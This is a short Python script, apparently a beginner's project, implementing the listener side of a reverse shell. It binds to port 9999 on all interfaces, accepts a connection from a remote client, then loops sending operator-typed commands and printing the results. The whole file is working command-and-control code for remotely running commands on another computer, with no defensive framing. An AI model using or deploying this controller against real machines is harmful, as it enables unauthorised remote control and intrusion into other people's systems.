import socket
import sys
import os


#s = socket.socket()

#Create Socket (Connect Two Computer)
def Create_Socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket() 
        
    except socket.error as msg:
        print("Message Socket Error = "+ str(msg))


#binding Socket
def Bind_Socket():
    try:
        global host
        global port
        global s
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("Message Socket Binding Error = "+ str(msg) +"\nRetrying .........")
        Bind_Socket()


#Establish Connection With Clients
def Socket_Accept_Connection():
    print("try to accept.....")
    conn,address=s.accept()
    print("Connection has been Established...." +" Ip="+str(address[0])+"Port= "+str(address[1]))


    print("Sending Command .......on conn =  "+str(conn))
    first_com = os.getcwd()+">>>>"
    conn.send(str.encode(first_com))
    Client_Response=str(conn.recv(4024),"utf-8")
    print("Client Respone..\n"+str(Client_Response),end="")

    #Send Commands to other through Conn Object. 
    send_Command(conn)
    conn.close()


#Send commands to other computer 
def send_Command(conn):
    #print("Sending Command .......on conn =  "+str(conn))
    #first_com = os.getcwd()+">>>>"
    #conn.send(str.encode(first_com))
    #Client_Response=str(conn.recv(1024),"utf-8")
    #print("Client Respone..\n"+str(Client_Response),end="")
    while True:
        cmd = input()
        if cmd == "quit":
            print("Quiting.....")
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            print("some Command was sent ....")
            conn.send(str.encode(cmd))
            #s.send(str.encode(cmd))
            
            Client_Response=str(conn.recv(4024),"utf-8")
            print("Client Respone..\n"+str(Client_Response),end="")





def main():
    #send_Command(3)
    Create_Socket()
    Bind_Socket()
    Socket_Accept_Connection()


if __name__=="__main__":
    main()





